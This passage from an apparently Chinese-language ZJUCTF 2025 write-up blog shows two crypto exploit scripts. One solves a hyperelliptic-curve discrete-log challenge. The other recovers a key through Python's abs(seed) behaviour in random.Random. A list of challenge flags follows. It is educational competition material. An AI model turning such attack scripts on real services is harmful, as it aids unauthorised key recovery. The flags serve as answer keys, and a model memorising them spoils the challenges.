class="string">&quot;无法从块中拆出 u,v: &quot;</span> + block)</span><br><span class="line">    u = strip_brackets(parts[<span class="number">0</span>])</span><br><span class="line">    v = strip_brackets(<span class="string">&quot;,&quot;</span>.join(parts[<span class="number">1</span>:]))</span><br><span class="line">    <span class="keyword">return</span> u.strip(), v.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normalize_v_string</span>(<span class="params">vs</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;y&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> vs <span class="keyword">and</span> <span class="string">&#x27;Y&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> vs:</span><br><span class="line">        <span class="keyword">return</span> vs</span><br><span class="line">    t = vs.lower().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    p = t.find(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> p == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> vs</span><br><span class="line">    rest = t[p+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">if</span> rest.startswith(<span class="string">&#x27;+&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> vs[vs.lower().find(<span class="string">&#x27;+&#x27;</span>)+<span class="number">1</span>:].strip()</span><br><span class="line">    <span class="keyword">if</span> rest.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">        cut = vs.lower().find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;-&quot;</span> + vs[cut+<span class="number">1</span>:]).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_uv_from_line</span>(<span class="params">line</span>):</span><br><span class="line">    blk = extract_uv_block(line)</span><br><span class="line">    u_str, v_str = split_u_v(blk)</span><br><span class="line">    v_str = normalize_v_string(v_str)</span><br><span class="line">    <span class="keyword">return</span> parse_poly_to_coeffs(u_str), parse_poly_to_coeffs(v_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_trim</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(a) &gt; <span class="number">1</span> <span class="keyword">and</span> a[-<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        a.pop()</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_add</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    n = <span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b))</span><br><span class="line">    out = [(<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = a[i] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(a) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        y = b[i] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(b) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        out[i] = (x + y) % p</span><br><span class="line">    <span class="keyword">return</span> poly_trim(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_sub</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    n = <span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b))</span><br><span class="line">    out = [(<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        x = a[i] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(a) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        y = b[i] <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(b) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        out[i] = (x - y) % p</span><br><span class="line">    <span class="keyword">return</span> poly_trim(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mul</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    out = [<span class="number">0</span>]*(<span class="built_in">len</span>(a)+<span class="built_in">len</span>(b)-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i,ai <span class="keyword">in</span> <span class="built_in">enumerate</span>(a):</span><br><span class="line">        <span class="keyword">if</span> ai == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j,bj <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">            <span class="keyword">if</span> bj == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">            out[i+j] = (out[i+j] + ai*bj) % p</span><br><span class="line">    <span class="keyword">return</span> poly_trim(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_divmod</span>(<span class="params">a, b, p</span>):</span><br><span class="line">    a = a[:]</span><br><span class="line">    b = poly_trim(b[:])</span><br><span class="line">    da = <span class="built_in">len</span>(a)-<span class="number">1</span></span><br><span class="line">    db = <span class="built_in">len</span>(b)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> db &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ZeroDivisionError</span><br><span class="line">    <span class="keyword">if</span> da &lt; db:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>], a</span><br><span class="line">    inv_lead = inverse_mod(b[-<span class="number">1</span>], p)</span><br><span class="line">    q = [<span class="number">0</span>]*(da-db+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(a)-<span class="number">1</span> &gt;= db <span class="keyword">and</span> <span class="built_in">any</span>(a):</span><br><span class="line">        k = <span class="built_in">len</span>(a)-<span class="number">1</span> - db</span><br><span class="line">        coeff = (a[-<span class="number">1</span>] * inv_lead) % p</span><br><span class="line">        q[k] = coeff</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(db+<span class="number">1</span>):</span><br><span class="line">            a[k+i] = (a[k+i] - coeff*b[i]) % p</span><br><span class="line">        a = poly_trim(a)</span><br><span class="line">    <span class="keyword">return</span> poly_trim(q), poly_trim(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">a, m, p</span>):</span><br><span class="line">    <span class="keyword">return</span> poly_divmod(a, m, p)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear_mod</span>(<span class="params">M, b, p</span>):</span><br><span class="line">    M = [row[:] <span class="keyword">for</span> row <span class="keyword">in</span> M]</span><br><span class="line">    b = b[:]</span><br><span class="line">    rows, cols = <span class="built_in">len</span>(M), <span class="number">5</span></span><br><span class="line">    r = c = <span class="number">0</span></span><br><span class="line">    where = [-<span class="number">1</span>]*cols</span><br><span class="line">    <span class="keyword">while</span> r &lt; rows <span class="keyword">and</span> c &lt; cols:</span><br><span class="line">        piv = r</span><br><span class="line">        <span class="keyword">while</span> piv &lt; rows <span class="keyword">and</span> M[piv][c] % p == <span class="number">0</span>:</span><br><span class="line">            piv += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> piv == rows:</span><br><span class="line">            c += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        M[r], M[piv] = M[piv], M[r]</span><br><span class="line">        b[r], b[piv] = b[piv], b[r]</span><br><span class="line">        inv = inverse_mod(M[r][c] % p, p)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c, cols):</span><br><span class="line">            M[r][j] = (M[r][j] * inv) % p</span><br><span class="line">        b[r] = (b[r] * inv) % p</span><br><span class="line">        where[c] = r</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">            <span class="keyword">if</span> i != r <span class="keyword">and</span> M[i][c] % p != <span class="number">0</span>:</span><br><span class="line">                factor = M[i][c] % p</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c, cols):</span><br><span class="line">                    M[i][j] = (M[i][j] - factor*M[r][j]) % p</span><br><span class="line">                b[i] = (b[i] - factor*b[r]) % p</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    x = [<span class="number">0</span>]*cols</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">        <span class="keyword">if</span> where[j] != -<span class="number">1</span>:</span><br><span class="line">            x[j] = b[where[j]] % p</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primes_16bit</span>():</span><br><span class="line">    L, R = <span class="number">1</span>&lt;&lt;<span class="number">15</span>, <span class="number">1</span>&lt;&lt;<span class="number">16</span></span><br><span class="line">    sieve = [<span class="literal">True</span>]*R</span><br><span class="line">    sieve[<span class="number">0</span>]=sieve[<span class="number">1</span>]=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(R**<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> sieve[i]:</span><br><span class="line">            step = i</span><br><span class="line">            start = i*i</span><br><span class="line">            sieve[start:R:step] = [<span class="literal">False</span>]*(((R-start-<span class="number">1</span>)//step)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L, R) <span class="keyword">if</span> sieve[i]]</span><br><span class="line"></span><br><span class="line">PRIMES16 = primes_16bit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    line = io.recvline().decode()</span><br><span class="line">    <span class="keyword">assert</span> line.startswith(<span class="string">&quot;p=&quot;</span>)</span><br><span class="line">    p = <span class="built_in">int</span>(line.strip().split(<span class="string">&quot;=&quot;</span>,<span class="number">1</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    line = io.recvline().decode()</span><br><span class="line">    <span class="keyword">assert</span> line.startswith(<span class="string">&quot;D=&quot;</span>)</span><br><span class="line">    D_u_coeffs, D_v_coeffs = parse_uv_from_line(line)</span><br><span class="line"></span><br><span class="line">    M = []</span><br><span class="line">    rhs = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_constraints</span>(<span class="params">u_coeffs, v_coeffs</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> M, rhs</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(u_coeffs) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        r = poly_mod(poly_mul(v_coeffs, v_coeffs, p), u_coeffs, p)  <span class="comment"># deg&lt;deg(u)</span></span><br><span class="line"></span><br><span class="line">        R0 = [<span class="number">1</span>]</span><br><span class="line">        R = [R0]</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            R.append(poly_mod(poly_mul(R[-<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>],p), u_coeffs, p))</span><br><span class="line"></span><br><span class="line">        max_j = <span class="built_in">min</span>(<span class="number">1</span>, <span class="built_in">len</span>(u_coeffs)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(max_j+<span class="number">1</span>):</span><br><span class="line">            cR5 = R[<span class="number">5</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">5</span>]) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            row = [</span><br><span class="line">                R[<span class="number">4</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">4</span>]) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                R[<span class="number">3</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">3</span>]) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                R[<span class="number">2</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">2</span>]) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                R[<span class="number">1</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">1</span>]) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                R[<span class="number">0</span>][j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(R[<span class="number">0</span>]) <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">            ]</span><br><span class="line">            M.append(row)</span><br><span class="line">            rhs.append(((r[j] <span class="keyword">if</span> j &lt; <span class="built_in">len</span>(r) <span class="keyword">else</span> <span class="number">0</span>) - cR5) % p)</span><br><span class="line"></span><br><span class="line">    add_constraints(D_u_coeffs, D_v_coeffs)</span><br><span class="line"></span><br><span class="line">    R_ring = PolynomialRing(GF(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    x = R_ring.gen()</span><br><span class="line">    H = <span class="literal">None</span></span><br><span class="line">    J = <span class="literal">None</span></span><br><span class="line">    f_poly = <span class="literal">None</span></span><br><span class="line">    D_elem = <span class="literal">None</span></span><br><span class="line">    ordD = <span class="literal">None</span></span><br><span class="line">    table_kD = <span class="literal">None</span>  <span class="comment"># [(kD, k)]</span></span><br><span class="line">    zero_elem = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    rounds = <span class="number">20</span></span><br><span class="line">    solved_curve = <span class="literal">False</span></span><br><span class="line">    built_table = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        chunk = io.recvuntil(<span class="string">b&quot;k2=&quot;</span>).decode()</span><br><span class="line">        d2_line = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> ln <span class="keyword">in</span> chunk.splitlines():</span><br><span class="line">            <span class="keyword">if</span> ln.startswith(<span class="string">&quot;D2=&quot;</span>):</span><br><span class="line">                d2_line = ln</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> d2_line <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            d2_line = chunk</span><br><span class="line">        U2, V2 = parse_uv_from_line(d2_line)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> solved_curve:</span><br><span class="line">            add_constraints(U2, V2)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(M) &gt;= <span class="number">5</span>:</span><br><span class="line">                a4,a3,a2,a1,a0 = solve_linear_mod(M, rhs, p)</span><br><span class="line">                f_poly = x**<span class="number">5</span> + a4*x**<span class="number">4</span> + a3*x**<span class="number">3</span> + a2*x**<span class="number">2</span> + a1*x + a0</span><br><span class="line">                H = HyperellipticCurve(f_poly)      <span class="comment"># y^2 = f(x)</span></span><br><span class="line">                J = H.jacobian()(GF(p))</span><br><span class="line"></span><br><span class="line">                uD = <span class="built_in">sum</span>((ZZ(c)%p)*(x**i) <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(D_u_coeffs))</span><br><span class="line">                vD = <span class="built_in">sum</span>((ZZ(c)%p)*(x**i) <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(D_v_coeffs))</span><br><span class="line">                D_elem = J([uD, vD])</span><br><span class="line">                zero_elem = D_elem - D_elem</span><br><span class="line"></span><br><span class="line">                <span class="comment"># |J(F_p)| = L(1)</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    L = H.lpolynomial()</span><br><span class="line">                    N = ZZ(L(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">except</span> (AttributeError, NotImplementedError):</span><br><span class="line">                    Z = H.zeta_function()</span><br><span class="line">                    L = Z.numerator()</span><br><span class="line">                    N = ZZ(L(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">                fac = factor(N)</span><br><span class="line">                ordD = ZZ(N)</span><br><span class="line">                <span class="keyword">for</span> pr, e <span class="keyword">in</span> fac:</span><br><span class="line">                    <span class="keyword">for</span> _<span class="built_in">pow</span> <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">                        tmp = ordD // pr</span><br><span class="line">                        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">if</span> (tmp * D_elem) == zero_elem:</span><br><span class="line">                            ordD = tmp</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                solved_curve = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> solved_curve:</span><br><span class="line">                io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> built_table:</span><br><span class="line">            table_kD = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> PRIMES16:</span><br><span class="line">                table_kD.append((k * D_elem, k))</span><br><span class="line">            built_table = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        u2 = <span class="built_in">sum</span>((ZZ(c)%p)*(x**i) <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(U2))</span><br><span class="line">        v2 = <span class="built_in">sum</span>((ZZ(c)%p)*(x**i) <span class="keyword">for</span> i,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(V2))</span><br><span class="line">        D2_elem = J([u2, v2])</span><br><span class="line"></span><br><span class="line">        k_found = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> kD, kval <span class="keyword">in</span> table_kD:</span><br><span class="line">            <span class="keyword">if</span> D2_elem == kD:</span><br><span class="line">                k_found = kval</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> k_found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> gcd(k_found, ordD) != <span class="number">1</span>:</span><br><span class="line">            io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        k2 = inverse_mod(ZZ(k_found), ZZ(ordD))</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(k2)).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(io.recvall(timeout=<span class="number">2</span>).decode())</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{Getting$Started?In^Hyperelliptic-Curve}</p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><ul>
<li>Python 的 <code>random.Random(seed)</code> 实际上会对种子做 <code>abs(seed)</code>，所以种子为 <code>s</code> 和 <code>-s</code> 时得到的随机序列完全一样</li>
<li>服务器里真正的种子是 <code>key ^ err</code>，我们发送全 0 明文，只拿到对应种子下的 keystream（密文 &#x3D; keystream）</li>
<li>构造两次查询的 <code>err</code>，使得当某一位为 0 时 <code>abs(key ^ err1) == abs(key ^ err2)</code>，为 1 时不相等，通过比较两次 keystream 是否相同，就能逐位恢复大整数 <code>key</code></li>
<li>最后把 <code>key</code> 按大端转换回字节串即可</li>
</ul>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_keystream</span>(<span class="params">io, errs</span>):</span><br><span class="line">    msg = <span class="string">b&quot;\x00&quot;</span> * <span class="number">64</span></span><br><span class="line">    outs = []</span><br><span class="line">    <span class="keyword">for</span> err <span class="keyword">in</span> errs:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;input msg: &#x27;</span>, msg.<span class="built_in">hex</span>().encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;input err: &#x27;</span>, <span class="built_in">str</span>(err).encode())</span><br><span class="line"></span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;encrypted: &#x27;</span>)</span><br><span class="line">        enc_line = io.recvline().strip()   <span class="comment"># 形如 b&#x27;abcdef0123...&#x27;</span></span><br><span class="line">        outs.append(<span class="built_in">bytes</span>.fromhex(enc_line.decode()))</span><br><span class="line">    <span class="keyword">return</span> outs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">61234</span>)</span><br><span class="line"></span><br><span class="line">    recovered = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span> * <span class="number">8</span>):</span><br><span class="line">        y1 = recovered + (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">        y2 = recovered - (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"></span><br><span class="line">        out1, out2 = get_keystream(io, [y1, y2])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> out1 != out2:</span><br><span class="line">            recovered |= (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"></span><br><span class="line">        flag_bytes = long_to_bytes(recovered)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] i = <span class="subst">&#123;i&#125;</span>, recovered = <span class="subst">&#123;flag_bytes!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;ZJUCTF&#123;&quot;</span> <span class="keyword">in</span> flag_bytes:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found flag: <span class="subst">&#123;flag_bytes.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>ZJUCTF{3d16f6b5-6bac-4d53-a5c0-9ddd99ea56c8}</p>
<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>ZJUCTF{w3lcOme_7O_ZJUCTF_2025_HapPY_3xp1oiT1nG} </p>
<h3 id="容器题说明"><a href="#容器题说明" class="headerlink" title="容器题说明"></a>容器题说明</h3><p>ZJUCTF{nOw_YOU_Know_contA1n3r_HAPPY_eXPIOI7lN6}</p>
<h3 id="签退问卷"><a href="#签退问卷" class="headerlink" title="签退问卷"></a>签退问卷</h3><p>ZJUCTF{THANk5_fOr_Y0U_parTiCIp@71on}</p>
<!-- flag of hidden posts --></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/11/17/zjuctf2025/">https://sakuraraindrop.github.io/2025/11/17/zjuctf2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%A4%A7%E4%BA%8E%E5%8A%AA%E5%8A%9B"><span class="toc-number">1.1.</span> <span class="toc-text">选择大于努力</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%AF%B4%E4%BD%A0%E4%B8%8D%E6%87%82-Linux"><span class="toc-number">1.2.</span> <span class="toc-text">你说你不懂 Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%A7%89%E9%86%92%E6%9D%A5%E5%85%A8%E4%B8%96%E7%95%8C%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">一觉醒来全世界计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjs-revenge"><span class="toc-number">1.4.</span> <span class="toc-text">ezjs-revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezjs-revenge-revenge"><span class="toc-number">1.5.</span> <span class="toc-text">ezjs_revenge_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Submit-Your-Paper"><span class="toc-number">1.6.</span> <span class="toc-text">Submit Your Paper!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bython-is-not-P"><span class="toc-number">1.7.</span> <span class="toc-text">Bython is not P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CoPHPy"><span class="toc-number">1.8.</span> <span class="toc-text">CoPHPy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B5%90%E6%9D%9F%E3%83%90%E3%83%B3%E3%83%89%E3%81%AE%E8%A9%A6%E7%B7%B4-%E6%B3%A2%E5%A5%87%E7%AF%87"><span class="toc-number">1.9.</span> <span class="toc-text">結束バンドの試練 - 波奇篇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezStack"><span class="toc-number">1.10.</span> <span class="toc-text">ezStack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-Paradox"><span class="toc-number">1.11.</span> <span class="toc-text">Time Paradox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#As-I%E2%80%99ve-written"><span class="toc-number">1.12.</span> <span 